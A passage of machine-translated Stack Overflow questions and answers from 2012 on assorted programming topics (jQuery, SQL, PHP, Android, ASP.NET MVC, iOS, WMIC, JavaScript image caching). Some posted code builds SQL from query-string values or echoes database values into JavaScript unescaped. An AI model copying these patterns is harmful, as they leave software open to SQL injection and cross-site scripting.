$(document).scroll(function (e) {
    if (document.body.scrollTop >= 300) {
       $('#my-div').show(200);
    } else {
      $('#my-div').hide(200);
    }
}); 
```

**CSS**

```
#my-div {
  position: fixed;
  top: 10px;
  left: 10px;
  width: 300px;
}
body {
  height: 11100px;
} 
```

**HTML**

```
<div id="my-div">
  Search: <input type="text" />
</div> 
```

演示：http: [//jsbin.com/welcome/49824](http://jsbin.com/welcome/49824)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:27:52.787

用于`.scroll()`触发事件，并用于`.scrollTop()`计算从页面顶部滚动的高度。

然后根据这个值，显示/隐藏工具：

```
 $(document).scroll(function(){
        if (document.body.scrollTop>300){
            $(".tools").show();
       } else
       {
           $(".tools").hide();
       }
    }); 
```

[**-- 查看演示 --**](http://jsfiddle.net/HUPxN/2)

# algorithm - 在最小堆中找到 k 个最小元素

> ID：13418461
> 
> 赞同：4
> 
> 时间：2012-11-16T14:21:29.353
> 
> 标签：algorithm

假设我有一个大小为 n 的最小堆。我想在不改变原始最小堆的情况下找到最小的 k 个元素。运行时间应该是 theta(k^2)。我可以使用内存 theta(k)。

我该怎么做？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-16T14:35:31.687

这是一个伪代码示例：

```
candidates.add((heap[heap.root],heap.root))
while len(result)<k:
  (min_value,i)=candidates.remove_min()
  result.append(min_value)
  l=heap.left_child(i)
  r=help.right_child(i)
  candidates.add((heap[l],l))
  candidates.add((heap[r],r)) 
```

假设堆有索引，您可以使用`heap[index]`. 包含最小值的根的索引是`heap.root`。`candidates`是一个辅助最小堆，最初为空，包含成对的值和堆索引。最小值`result`按顺序存储在 中。

循环执行 k 次。所有操作都是常数时间，除了`candidates.remove_min()`和`candidates.add()`，它们是 O(log(k))，所以总时间是 O(k*log(k))。

# sass - susy with Scout：无法将 Scout 配置为需要 susy

> ID：13418466
> 
> 赞同：1
> 
> 时间：2012-11-16T14:21:37.373
> 
> 标签：sass, susy-compass

我已经安装了 susy 并检查了它是否存在，我可以从命令行使用 susy 创建一个新项目，但是当我尝试使用 Scout 执行此操作时遇到了问题。我添加了一个仅包含 require 'susy' 的配置文件，并将其放在项目的 Scout 目录中，并更新 gui 配置以引用它。当我为尝试 @import susy 的项目启动 Scout 时，我得到

“org/jruby/RubyKernel.java 的第 1038 行的 LoadError：没有要加载的文件——susy”

想知道是否有人在 Scout 上运行过 susy，如果有，他们是如何设置的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T13:16:44.237

ScoutApp 不支持自定义库 (gem)。所有 gem 都与 ScoutApp 捆绑在一起，不能通过 UI 或通过配置文件（例如`compass.rb`或`config.rb`）进行更改。

实际上，ScoutApp 只[提供](https://github.com/mhs/scout-app/blob/master/src/config/Gemfile)对[compass-960-plugin](http://github.com/chriseppstein/compass-960-plugin)、[yui-compass-plugin](http://github.com/chriseppstein/yui-compass-plugin)、[compass-h5bp](http://rubygems.org/gems/compass-h5bp)和[zen-grids](http://zengrids.com/)的访问。

*来源：[允许人们配置自己的 Rubygems](https://github.com/mhs/scout-app/issues/66)。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-19T23:41:36.623

一个非常简单的解决方案是从 Github 上下载 Susy - 只是 SCSS 文件。将 susy 目录放入您的项目中并导入主 Susy 文件。适用于 CodeKit（甚至是 CodeKit 框架），所以我认为它也应该适用于 Scout。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-30T18:47:44.510

最新版本的 Scout-App 内置了 Susy mixins，但是 Scout-App 2 不再基于 Ruby，因此它不支持任何 Susy gem。

要使用 Scout-App 附带的 Susy mixin，只需将以下任何行添加到您的 Sass 中：

```
@import "su";
@import "susy";
@import "susyone"; 
```

它将导入此处看到的代码：

*   [https://github.com/oddbird/susy/tree/master/sass](https://github.com/oddbird/susy/tree/master/sass)

最新版本的 Scout-App 可在其网站上找到：

*   [http://Scout-App.io](http://Scout-App.io)

# php - 是否有任何常见的 PHP 类用于将 SQL 结果集转换为 json

> ID：13418467
> 
> 赞同：2
> 
> 时间：2012-11-16T14:21:39.603
> 
> 标签：php, sql, json

我使用[D3](http://d3js.org/)制作一些图表

为每个查询手动形成一个 json 似乎有点反直觉

有一个更好的方法吗？

还是为每个图表制作一个 json php 脚本并尝试让我的数据适合，或者我可以获得一个通用的 php 脚本来配置从 sql 输出的 json？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:26:51.247

这有什么难的？

```
$sql = "SELECT field1, field2, field3, ....";
$result = mysql_query($sql) or die(mysql_error());
$data = array();
while($row = mysql_fetch_assoc($result)) {
    $data[] = $row;
}
echo json_encode($data);  // <--- was that so hard? 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:26:30.920

很简单，只是`json_encode`使用函数的结果数组。

```
header('Content-type: application/json'); //for cooperation with D3

function getJsonChartResults($tablename,$columns = Array())
{
    $fields = count($columns) == 0 ? "*" : implode(",", $columns);
    $dbh = new PDO('mysql:host='.DATABASE_HOST.';dbname='.DATABASE_NAME, DATABASE_USER, DATABASE_PASSWORD);
    $results = $dbh->query("SELECT ".$fields." FROM ".$tablename);
    $dbh = null;
    return json_encode($results);
}

echo getJsonChartResults("Results"); //Get data for all collumns
echo getJsonChartResults("Results",Array("id","key","value")); //Get data for specified collumns 
```

# statistics - 隐马尔可夫模型 - 识别音素

> ID：13418472
> 
> 赞同：0
> 
> 时间：2012-11-16T14:22:14.873
> 
> 标签：statistics, signal-processing, speech-recognition, hidden-markov-models

我正在开发一个识别音素的项目，以便能够识别某人是在说“是”还是“否”。

到目前为止，在项目中，我已经使用过零来识别这个人在说什么，这非常有效，而且看起来很容易理解。然而，该项目需要一些改进，并且必须使用隐马尔可夫模型进行开发。

我的问题是这样的：

我想开发一个隐马尔可夫模型，而不删除我已经完成的工作。即，我通过计算过零的数量以及块的总和来去除不值得考虑的数据。

我不明白我需要什么数据来训练 HMM 才能识别这些音素。例如

对于过零，我已经确定：

**是 - 过零开始低，然后值增加**

**否 - 零交叉点从低位开始，然后不随值增加。**

我可以训练我的 HMM 算法以便它解释这些值吗？

或者任何人都可以建议一种方法，我可以训练 HMM 以识别样本中输入的单词？

希望有人可以提供帮助:)！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T07:49:25.843

> 我可以训练我的 HMM 算法以便它解释这些值吗？

当然是

> 或者任何人都可以建议一种方法，我可以训练 HMM 以识别样本中输入的单词？

您只需将零交叉率与第 14 个特征等 MFCC 特征一起放入特征文件中，并使用任何标准 HMM 训练工具包（如 CMUSphinx 或 HTK）来训练 HMM 并使用它进行解码。有关更多信息，请参阅

[http://cmusphinx.sourceforge.net/wiki/mfcformat](http://cmusphinx.sourceforge.net/wiki/mfcformat)

或者

[http://speech-research.com/htkSearch/index.php?ID=297039](http://speech-research.com/htkSearch/index.php?ID=297039)

[http://speech-research.com/SRTxt2User/index.html](http://speech-research.com/SRTxt2User/index.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T22:11:32.073

自动音素分割是一个棘手的问题，因此我将提供一些我喜欢的资源，这些资源以各种详细程度触及该主题。

本文： [http ://www.seas.upenn.edu/~jan/Files/Iscas99Speech.pdf](http://www.seas.upenn.edu/~jan/Files/Iscas99Speech.pdf)

本文： [http ://www.ll.mit.edu/publications/journal/pdf/vol08_no2/8.2.1.languageidentification.pdf](http://www.ll.mit.edu/publications/journal/pdf/vol08_no2/8.2.1.languageidentification.pdf)

这个资源很好： [http ://research.microsoft.com/pubs/118769/Book-Chap-HuangDeng2010.pdf](http://research.microsoft.com/pubs/118769/Book-Chap-HuangDeng2010.pdf)

这本书给出了一些音素识别的好例子：http: [//www.amazon.com/Speech-Recognition-Theory-C-Implementation/dp/0471977306/](https://rads.stackoverflow.com/amzn/click/com/0471977306)

这本书也不错： [http ://www.amazon.com/Statistical-Methods-Recognition-Language-Communication/dp/0262100665/](https://rads.stackoverflow.com/amzn/click/com/0262100665)

这些书很贵，但值得（在我看来）

# android - 如何纠正自动生成的 IMarketBillingService.java 文件中的错误？

> ID：13418476
> 
> 赞同：28
> 
> 时间：2012-11-16T14:22:23.360
> 
> 标签：android, in-app-billing

我正在尝试`In app billing`在我的 Andorid 应用程序中实现服务。

我已将该`IMarketBillingService.aidl`文件添加到我在 Eclipse 中的项目中。然后 Eclipse 自动生成了该`IMarketBillingService.java`文件，但有很多错误。

```
@Override public android.os.IBinder asBinder() { return mRemote; }
- implements android.os.IInterface.asBinder
- The method asBinder() of type IMarketBillingService.Stub.Proxy must override asuperclass  method

@Override public android.os.Bundle sendBillingRequest(android.os.Bundle bundle) throws android.os.RemoteException
{
android.os.Parcel _data = android.os.Parcel.obtain();
android.os.Parcel _reply = android.os.Parcel.obtain();
android.os.Bundle _result;
......
}
- The method sendBillingRequest(Bundle) of type IMarketBillingService.Stub.Proxy must override a superclass method
- implements com.android.vending.billing.IMarketBillingService.sendBillingRequest 
```

谁能帮我这个？

我正在使用 Mac、Eclipse Juno 和最新版本的 Android SDK。

* * *

## 回答 #1

> 赞同：78
> 
> 时间：2012-11-17T08:36:02.270

您可能会尝试使用默认编译选项。

1.  右键单击（或按住 Control 单击）项目并选择“属性”
2.  选择“Java 编译器”
3.  取消选中“启用项目特定设置”

Eclipse 会提示重新编译，应该没问题。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-06-28T23:38:40.030

在生成的 IInAppBillingService.java 中也出现了许多错误。我尝试了很多很多建议的解决方案，但都没有成功。最后，Zedifire 方法的一个变体适用于我的 Eclipse SDK。（这些步骤来自记忆 - 试一试，直到它起作用！）

1.  关闭>项目>自动构建
2.  删除 /gen 文件
3.  然后转到 >Window>Preferences>Java>Compiler 并发现不知何故合规级别默认为 1.5
4.  将合规性更改回 1.7 级
5.  >项目>清洁
6.  >项目>全部构建（仍然错误！）
7.  **右键单击**项目窗口>android工具>修复项目属性

瞧——生成的文件最终编译没有错误！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-10T18:19:34.330

Project-->clean and build 也可以解决它

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-25T11:38:32.333

原因是，Java 1.5 不支持重写接口方法。 [https://stackoverflow.com/a/212642/1283492](https://stackoverflow.com/a/212642/1283492) 从 Java 1.6 开始是允许的。因此，正如easycheese 所述，需要将Java 1.6 或更高版本放在项目属性的Java 编译器设置中。

# c# - Asp.Net MVC4 中的复选框列表

> ID：13418488
> 
> 赞同：2
> 
> 时间：2012-11-16T14:23:21.250
> 
> 标签：c#, asp.net, asp.net-mvc, checkbox, asp.net-mvc-4

我正在尝试在我的视图中实现 CheckBoxList 并在列表中获取选定的复选框值列表。

我尝试了此[链接](https://stackoverflow.com/questions/12650441/asp-net-mvc4-display-checkboxlist)中的示例，但无法获取选定的选中列表项。

我的观点

```
@foreach (var item in Model)
{
    <tr>
        <td align="center" class="Text_nocolor singleCheckbox">
            <input type="checkbox" class="checkbox" value="@item.ProductID" name="selectedObjects"/>
            @Html.HiddenFor(modelItem => item.ProductName)
        </td>
        <td align="center" class="Text_nocolor" id="myimage">
            <img src="@Url.Content(item.Imageurl)" width="40px" height="40px"  title="@item.ProductName" alt="Product"  class="myimage" style="border-style:none;"/>
        </td>
        <td align="left" class="Text_nocolor">
            @Html.DisplayFor(modelItem => item.ProductName)
        </td>
    </tr>
}
@Html.ActionLink(" ", "Checkout", new { controller = "Checkout", UserID = Request.QueryString["UserID"], Partnerid = Request.QueryString["Partnerid"] }, new { @class = "btnCheckout" }) 
```

控制器代码（索引）：

```
SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings["DBConnection"].ConnectionString);
public IList<CartModel> GetCartDetails(string id, string partnerid)
{
    List<CartModel> CartDetails = new List<CartModel>();
    {
        con.Open();
        SqlCommand cmd = new SqlCommand("select * from tablename where [User ID]='" + id + "' and [Partner ID]='" + partnerid + "'", con);
        SqlDataAdapter da = new SqlDataAdapter(cmd);
        DataTable dt = new DataTable();
        da.Fill(dt);
        if (dt.Rows.Count > 0)
        {
            for (int i = 0; i < dt.Rows.Count; i++)
            {
                CartModel cartInfo = new CartModel();
                cartInfo.ProductName = dt.Rows[i]["Product Name"].ToString();
                cartInfo.Imageurl = "~/Handler.ashx?Pid=" + dt.Rows[i]["Product ID"].ToString() + "&Imgid=1&Partnerid=" + partnerid;
                CartDetails.Add(cartInfo);
            }
        }
        con.Close();
    }
    return CartDetails;
}

public ActionResult Index()
{
    id = Request.QueryString["UserID"];
    partnerid = Request.QueryString["Partnerid"];
    IList<CartModel> objshop = new List<CartModel>();
    objshop = GetCartDetails(id, partnerid);
    ViewBag.Categories = objshop.ToList();
    return View(objshop.ToList());
}

public ActionResult Checkout(string id, string partnerid, int[] categories)
{
    string id = Request.QueryString["UserID"];
    string partnerid = Request.QueryString["Partnerid"];
    //How to get the selected checked list items as a list.
    return View();
} 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T05:30:06.743

最后，我通过 Webgrid 得到了一个复选框列表。

请参阅此博客 [http://weblogs.asp.net/imranbaloch/archive/2011/09/13/webgrid-helper-with-check-all-checkboxes.aspx](http://weblogs.asp.net/imranbaloch/archive/2011/09/13/webgrid-helper-with-check-all-checkboxes.aspx)

```
 @grid.GetHtmlWithSelectAllCheckBox(tableStyle: "webGrid",
            headerStyle: "header",
            checkBoxValue: "ProductID",
            columns: grid.Columns(
            grid.Column(columnName: "", format: @<text><img src="@Url.Content(item.Imageurl)" class="image" alt="Image "/></text>, style: "txtalignleft"),
            grid.Column(columnName: "ProductName", style: "txtalignleft"),
            grid.Column(columnName: "Quantity", style: "txtcenter"),
            grid.Column("Edit", " ", style: "txtalignleft", format: @<a href="@Url.Action("Index", "Cart", new { UserID = Request.QueryString["UserID"], partnerid = Request.QueryString["Partnerid"] })"><img
                alt="edititem" style="vertical-align: middle; text-align: justify; border-style: none;"
                height="17px" src="../../Images/edit.png" title="Edit" id="imgEdit" /></a>),
            grid.Column(columnName: "Rate", style: "txtalign"),
            grid.Column(columnName: "Price", style: "txtalign")
      )) 
```

# batch-file - 是否有将“允许用户更改密码”设置为 false 的批处理脚本？

> ID：13418493
> 
> 赞同：0
> 
> 时间：2012-11-16T14:23:35.043
> 
> 标签：batch-file, windows-xp

我创建了一个脚本，当您运行它时，它将所有帐户的“密码永不过期”设置为 false，因此密码永不过期。脚本如下：

```
WMIC USERACCOUNT WHERE "Name='administrator'" SET PasswordExpires=FALSE 
```

我想知道是否有一个脚本可以让我确保“允许用户更改密码”框也被勾选，但我无法做到这一点。我尝试了以下脚本行：

```
WMIC USERACCOUNT WHERE "Name='administrator'" SET PasswordChange=FALSE

WMIC USERACCOUNT WHERE "Name='administrator'" SET AllowPasswordChange=FALSE 
```

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T14:32:28.000

在网上搜索了一下，我想你是

```
PasswordChangeable 
```

# d3.js - d3 GEO - 缩放以适应边界框

> ID：13418494
> 
> 赞同：1
> 
> 时间：2012-11-16T14:23:36.190
> 
> 标签：d3.js, zooming

我正在使用 d3 突出显示各个国家/地区，并设法根据左下角、左上角、右下角和右上角的大多数国家创建了一个边界框。

到目前为止一切顺利，但是我无法找到如何“放大”到那个边界框。

我很欣赏虽然我的 SVG 元素大约为 800x400 像素，但边界框的比例并不总是符合该 SVG 元素，但至少，我希望能够以某种方式放大。

有没有人有任何关于如何实现这一目标的例子？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T15:43:08.783

看看[这个例子](http://www.larsko.org/v/igdp/)。它限制了放大，这样小国家就不会被放大太多，但如果你不想要的话，应该很容易改变。

[这个问题](https://stackoverflow.com/questions/13274151/d3js-scale-transform-and-translate/)也可能有帮助。

# sql - 使用 SQL 计算行数

> ID：13418497
> 
> 赞同：0
> 
> 时间：2012-11-16T14:23:46.010
> 
> 标签：sql, count, rows

请帮助我创建 SQL 查询。

我有两个表，公司和用户。users 表有 company_id 字段。

我需要计算有多少公司根本没有用户。

任何帮助都会很好！谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:24:57.740

```
SELECT COUNT(*)
FROM companies a LEFT JOIN users b
       on a.company_ID = b.company_ID
WHERE b.company_ID IS NULL 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/cd139/1)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:25:33.477

```
SELECT COUNT(*) 
FROM companies c
WHERE NOT EXISTS
(
  SELECT 1 FROM users u
  WHERE u.company_id = c.company_id
) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-16T14:25:44.337

```
SELECT COUNT(*)
FROM companies c LEFT JOIN users u
ON c.company_id = u.company_id
WHERE u.company_id IS NULL 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-16T14:26:15.270

```
Select Count(tblCompanies.ID)
From tblCompanies
left join tblUsers ON tblCompanies.ID = tblUsers.CompanyID
Where tblUsersID IS Null
Group By tblCompanies.ID 
```

# php - 谷歌图表 Mysql 和 php

> ID：13418502
> 
> 赞同：0
> 
> 时间：2012-11-16T14:23:56.433
> 
> 标签：php, mysql, charts

```
<script type="text/javascript">
    function drawVisualization() {
        // Prepare the data
    <?php   while($row = mysql_fetch_array($result)){ ?>
        var data = google.visualization.arrayToDataTable([
          ['Name', 'Gender', 'Age', 'Freqency'],
          ['<?php echo $row['name']?>', 
           '<?php echo $row['gender']?>', 
           '<?php echo $row['age']?>', 
           '<?php echo $row['freq']?>']
        ]);
    <?php  ?>
    }

...

</script> 
```

这可行并出现一个图表，但只显示数据库表中的最后一个条目，并且有 4 个条目。

我究竟做错了什么？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-16T14:30:22.727

尝试一下：

```
<script type="text/javascript">
      function drawVisualization() {
        // Prepare the data

        var data = google.visualization.arrayToDataTable([
          ['Name', 'Gender', 'Age', 'Freqency'],
          <?php   while($row = mysql_fetch_array($result)){ ?>
          ['<?php echo $row['name']?>' , '<?php echo $row['gender']?>', <?php echo $row['age']?>, <?php echo $row['freq']?>],
          <?php } ?>
        ]); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:30:14.400

您正在构建错误的数据结构。如果您查看了生成页面的源代码，您会看到

```
 var data = google.visualization.arrayToDataTable(...);
 var data = google.visualization.arrayToDataTable(...);
 var data = google.visualization.arrayToDataTable(...);
 var data = google.visualization.arrayToDataTable(...); 
```

每个新行都会覆盖/销毁前一行。将`var data`行移出 fetch 循环：

```
var data = google.visualiation.arrayToDataTable([
['Name', 'Gender', 'Age', 'Freqency'],
<?php 
while($row = mysql_fetch_array($result)) {
    echo json_encode($row);
}
?> 
```

这可能行不通，但应该给你一个大致的想法。注意 json_encode() 的使用。你没有在你的代码中使用它，如果一个人的名字（比如说）包含一个`'`，你会引入一个 javascript 语法错误并杀死整个脚本。使用 json_encode() 保证您将 php 数据转换为语法正确的 javascript。

# github - 手动将 git commit 分配给 github 问题

> ID：13418512
> 
> 赞同：8
> 
> 时间：2012-11-16T14:24:44.977
> 
> 标签：github

是否可以在不使用自动提交 + 问题集成的情况下将现有提交分配给问题（例如，在提交标题中修复 #XXX、关闭 #XXX 等）？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2016-01-27T02:59:37.427

继续你的**提交**，并在 *number of your issue** 前面加上一个标签（例如#6）来评论它。然后，提交将在问题时间线中“引用”。

这与直接集成提交不同，但它更接近于使用提交哈希（这也是一种替代方法）简单地评论问题。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-16T14:44:55.287

这不是一个完全令人满意的答案，但我注意到如果我们将提交的链接粘贴到评论中，github 会自动将其作为链接引用添加为短哈希。

输入：

```
https://github.com/user/Repository/commit/a49c5c587185d3bee80a32e7fc4f9ea4e94289a8 
```

输出：

```
a49c5c5 
```

# objective-c - iOS 6 中未显示活动指示器

> ID：13418513
> 
> 赞同：0
> 
> 时间：2012-11-16T14:24:47.943
> 
> 标签：objective-c, ios

在我的应用程序委托中的 (void)applicationDidFinishLaunching:(UIApplication *)application 方法中，我有以下代码来显示活动指示器：

```
spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];
spinner.alpha = 1.0;
spinner.center = self.window.center;
spinner.layer.shadowColor = [UIColor grayColor].CGColor;
spinner.layer.shadowRadius = 1;
spinner.layer.shadowOpacity = 0.5;
spinner.layer.shadowOffset = CGSizeMake(0, 1);
[self.window addSubview:spinner]; 
```

上面的代码在 iOS 5 及更早版本中运行良好。但是，活动指示器在 iOS 6 中不显示。如何修改上述代码，以便在 iOS 6 中也显示活动指示器？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:32:46.203

尝试将最后两行添加到您的代码中：

```
spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];
spinner.alpha = 1.0;
spinner.center = self.window.center;
spinner.layer.shadowColor = [UIColor grayColor].CGColor;
spinner.layer.shadowRadius = 1;
spinner.layer.shadowOpacity = 0.5;
spinner.layer.shadowOffset = CGSizeMake(0, 1);
[self.window addSubview:spinner];

[spinner setHidden:YES];
[spinner startAnimating]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T19:45:52.143

`applicationDidFinishLaunching:withOptions:`请记住，在方法返回之前，UI 中不会显示任何视图。您不能设置 a`UIActivityIndicatorView`并期望它立即显示。在当前运行循环完成之前，iOS 不会更新 UI。从表面上看，您`Default.png`正在执行期间显示，`applicationDidFinishLaunching:withOptions:`并且在该方法完成之前您`rootViewController`不会接管 UI。

`UIActivityIndicatorView`如果您希望向`Default.png`用户显示应用程序正在启动，那么您可以执行以下操作：

```
UIImageView *imageView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"Default.png"]];
spinner = [[UIActivityIndicatorView alloc] initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];
spinner.frame = CGRectMake(0.0, 0.0, 60.0, 60.0);
spinner.center = CGPointMake(imageView.center.x, imageView.center.y);

spinner.alpha = 1.0;
spinner.layer.shadowColor = [UIColor grayColor].CGColor;
spinner.layer.shadowRadius = 1;
spinner.layer.shadowOpacity = 0.5;
spinner.layer.shadowOffset = CGSizeMake(0, 1);
[spinner startAnimating];
[imageView addSubview:spinner];
[self.window addSubview:imageView];
[self.window makeKeyAndVisible];    

dispatch_async(dispatch_get_main_queue(), ^{
    // The rest of your method here
    // Be sure to remove the UIImageView from the window when the processing is complete.
}); 
```

这样，`applicationDidFinishLaunching:withOptions:`将控制权返回给 iOS 并显示视图。一旦你加载了你的`rootViewController`，你可以`imageView`从窗口中删除 。

`UIActivityIndicatorView`此外，将直接添加到 不是一个好主意`UIWindow`，而是应该将其添加到已经是窗口的子视图的预先存在的视图中，就像我上面演示的那样。

我希望这有帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T21:06:48.590

添加以下行：

```
[spinner performSelector:@selector(startAnimating) withObject:nil afterDelay:0.0f]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-05-14T07:57:49.953

`UIActivityIndicatorView`我在使用a时遇到了类似的问题`UITableViewCell`。问题是调用`startAnimating`单元创建方法不起作用。

为了解决这个问题，我在`startAnimating`方法中调用了`cellForRowAtIndexPath`方法。

这可能与调用相同`startAnimating`。`applicationDidFinishLaunching`您需要在实际显示窗口时调用它。计时器可以工作，甚至更好，创建一个`UIViewController`并将微调器放在该视图中。

# c# - 从 Assembly 生成 PDF 报告

> ID：13418519
> 
> 赞同：0
> 
> 时间：2012-11-16T14:25:24.183
> 
> 标签：c#, asp.net, sql, reporting, .net-assembly

我有一个在 ASPX 项目中实现的报告“MyCustomReport.rdlc”。

现在我创建了一个程序集，我也想从中填写此报告（在单独的 C# 文件中），以便稍后将其附加到电子邮件并将其发送给客户，它也将保存在本地文件夹中。

报告中的数据集保持不变。

所以基本上我需要从程序集中访问我的报告，然后从报告模板生成我的 PDF，但是我不能在程序集项目中使用“LocalReport”的实例。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T14:44:20.873

你不能 - 简单的答案。

如果您无法添加对 Microsoft.Reporting.WebForms 的引用：

您必须将程序集中的“目标框架”从“.NET Framework 3.5（4 或 4.5）客户端配置文件”更改为“.NET Framework 3.5（4 或 4.5）”。所以现在您可以添加对 Microsoft.Reporting.WebForms 的引用。现在您可以使用 Render 方法。

# javascript - 使用 JavaScript 更新图形时存在持续流量的风险？

> ID：13418523
> 
> 赞同：5
> 
> 时间：2012-11-16T14:25:34.563
> 
> 标签：javascript, dom, dhtml, performance

我正在使用 JavaScript 在 HTML 页面上创建一个基本的图形时钟显示。我正在使用标准 DOM 机制更新数字图形（每个数字仅在必要时更新）：

```
digitOne.src = "file/path/one.png"; 
```

时钟工作正常，但我想知道每次更改 src 属性时所有或某些浏览器是否会盲目地从我的站点获取图像，而不是在 RAM 中缓存副本。我担心在某些情况下，也许在旧版浏览器中，查看图形时钟会不断产生数据流量并消耗我每月的数据限额。

所以我希望有人能告诉我这是否有风险，或者指出一种在 JavaScript 中交换图形的机制，它保证了现有图像将从内存中使用，而不是每次都触发网络获取。

（我一直在寻找一个明确的答案，但找不到一个。自 1999/2000 年以来，我没有将 JavaScript 用于 DHTML，所以我有点落伍了。至少不再需要编写每个 JavaScript 函数的两个版本，一个用于 IE4/5，一个用于 Netscape 4。）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-18T16:04:38.463

您不必担心交通问题。初始化应用程序时很容易缓存图像。在以下 JSFiddle 中查看我的示例：http: [//jsfiddle.net/pAwdC/](http://jsfiddle.net/pAwdC/)。当我初始化我正在调用的应用程序时`loadImages`。`img`此方法为每个数字创建DOM 元素。它`src`是从数组中取出的`imagesSrc`。调用该`loadImages`函数时，浏览器向服务器发出少量 HTTP get 请求：

![在此处输入图像描述](../Images/b67cb3a8839e90b261f2de9d70833231.png)

实际上，每个请求都是在以下情况下发出的：

```
current.src = imagesSrc[i]; 
```

被执行。

加载图像后，我只是将它们隐藏起来。当图像带有`display: none`或`visibility: hidden`用户实际上看不到它们，但是当您使这些隐藏元素可见时，不再发出请求，只有最终的[重绘、重排/重布局、重新样式](http://www.phpied.com/rendering-repaint-reflowrelayout-restyle/)由浏览器完成。仅在需要时才缓存和显示所有元素。您可以检查您的萤火虫或您正在使用的任何其他开发工具，以确保不再请求这些图像。

这是我的示例中的代码：

```
var images = [],
    imagesSrc = ['https://lh3.ggpht.com/-107YXK-eAXs/UB6V49H9yuI/AAAAAAAACsY/69ceZJXaYZE/s1600/number-one-.png',
    'https://lh3.ggpht.com/-8rOrxAwDl48/Txf99Sus18I/AAAAAAAAL1w/VcmeP7rNFwY/s1600/number2c.png',
    'https://lh3.ggpht.com/-aGatHUidcGw/UG6Oh2HdWXI/AAAAAAAADQY/yc1CTC7cpOY/s1600/number3.png'];

function loadImages() {
    var current;
    for (var i = 0; i < imagesSrc.length; i += 1) {
        current = document.createElement('img');
        current.src = imagesSrc[i];
        images.push(current);
        current.style.display = 'none';
        document.body.appendChild(current);
    }
}

function showImage() {
    var current = showImage.current || 0;
    if (current >= 3) {
        current = 0;
    }
    hideImages();
    images[current].style.display = 'block';
    current += 1;
    showImage.current = current;
    setTimeout(function () {
        showImage();
    }, 1000);
}

function hideImages() {
    for (var i = 0; i < images.length; i += 1) {
        images[i].style.display = 'none';
    }
}

loadImages();
showImage(); 
```

对于我的示例，我只需要每个数字的一​​个实例。当然，对于您的时钟，您可以`img`为每个数字创建四个实例（四个 DOM 元素），以便显示重复项。

对于您的应用程序，更好的方法可能是按需加载图像，但只加载一次然后缓存它们。这样做很好，因为用户可能不会停留在您的页面上查看每个数字（从 0 到 9），并且您可以通过这种延迟加载稍微提高性能。对于这种策略，您可以检查[享元模式](http://addyosmani.com/resources/essentialjsdesignpatterns/book/#detailflyweight)。它的主要思想是管理一组可重用的小对象并按需使用它们，同时控制它的创建。这是一个显示模式结构的 UML 类图：

![在此处输入图像描述](../Images/90064a14df4e13a89763362a09358463.png)

我提到的方法有不同的变体。您可以做的最轻的变化可能是使用包含所有数字的单个图像。之后，您可以创建具有数字大小的不同元素（例如 div）。当您为这些元素设置具有特定位置的背景时，您可以通过仅加载单个图像来创建所有数字。这会将您的请求从 10 个减少到一个。例如，Facebook 有效地使用了这种方法。

如果您需要进一步的帮助，我很乐意提供帮助。​</p>

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-18T15:55:48.247

如果启用了 CSS，则以下模式有效。我提出这个是因为如果不是，它比解决方案更清晰一些。

```
<div id='clock'>
  <div id='digit0' style="display:block"><!-- ... --></div>
  <div id='digit1' style="display:none"><!-- ... --></div>
  <div id='digit2' style="display:none"><!-- ... --></div>
  <!-- ... -->
</div> 
```

要更改数字显示，请隐藏当前可见的数字并使下一个可见。仅 JavaScript 的解决方案是相关的。使单个不可见`<div>`以隐藏不可见的数字。添加和删​​除单个数字`<div>`元素，将时钟显示中的旧数字与数字仓库元素中的下一个数字交换。

这两种解决方案都有这样的行为，即 DOM 子树中的图像只获取一次，因为子树永远不会被删除。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-19T18:55:01.450

我建议您使用 HTML5 画布 2D 绘图。它根本不需要任何图像，目前所有浏览器的所有较新版本都支持它，即使在 IE 中也是如此。看一下这个

[http://www.neilwallis.com/projects/html5/clock/index.php](http://www.neilwallis.com/projects/html5/clock/index.php)

阅读这个简单但很棒的教程：

[http://diveintohtml5.info/canvas.html](http://diveintohtml5.info/canvas.html)

* * *

